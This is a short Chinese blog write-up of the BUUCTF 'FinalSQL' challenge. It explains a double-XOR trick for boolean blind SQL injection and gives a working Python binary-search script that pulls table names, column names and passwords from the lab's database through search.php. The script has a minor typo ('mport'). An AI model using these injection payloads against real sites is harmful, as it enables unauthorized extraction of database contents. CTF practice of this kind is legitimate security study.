---
title: '[极客大挑战 2019]FinalSQL 1'
categories:
  - 
tags: []
abbrlink: 2d7fedc0
date: 2026-02-16 18:22:36
---
# [极客大挑战 2019]FinalSQL

# 1







这里有2个异或，是为什么？

如果只有一个异或：

1^1=0

0^1=1

就出现了问题：如果对的反而错误页面是错的，逻辑反面可以反着来思考，但是不完美

```
?id=1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))=105)^1
```

那两个异或解决了这个问题

```
1^1^1=1
1^0^1=0
```







```python
mport requests
# 使用二分法
url = ''
flag = ''
MaxLen = 250
for i in range(1,MaxLen):
    # range(1, 11) 从 1 开始到 11,[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]  range(0, 30, 5) 步长为 5 [0, 5, 10, 15, 20, 25]
    low = 32
    high = 128
    mid = (low+high)//2
    while(low<high):
        payload = "http://7407ade4-c95c-4ed8-921b-7a5d559a623c.node4.buuoj.cn:81/search.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)" %(i,mid)
        # payload = "http://7407ade4-c95c-4ed8-921b-7a5d559a623c.node4.buuoj.cn:81/search.php?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))>%d)" %(i,mid)
        # payload = "http://7407ade4-c95c-4ed8-921b-7a5d559a623c.node4.buuoj.cn:81/search.php?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)" %(i,mid)
        res = requests.get(url=payload)
        if 'ERROR' in res.text:
            low = mid+1
        else:
            high = mid
        mid = (low+high)//2
    if(mid ==32 or mid ==127):
        break
    flag = flag+chr(mid)
    print(flag)
```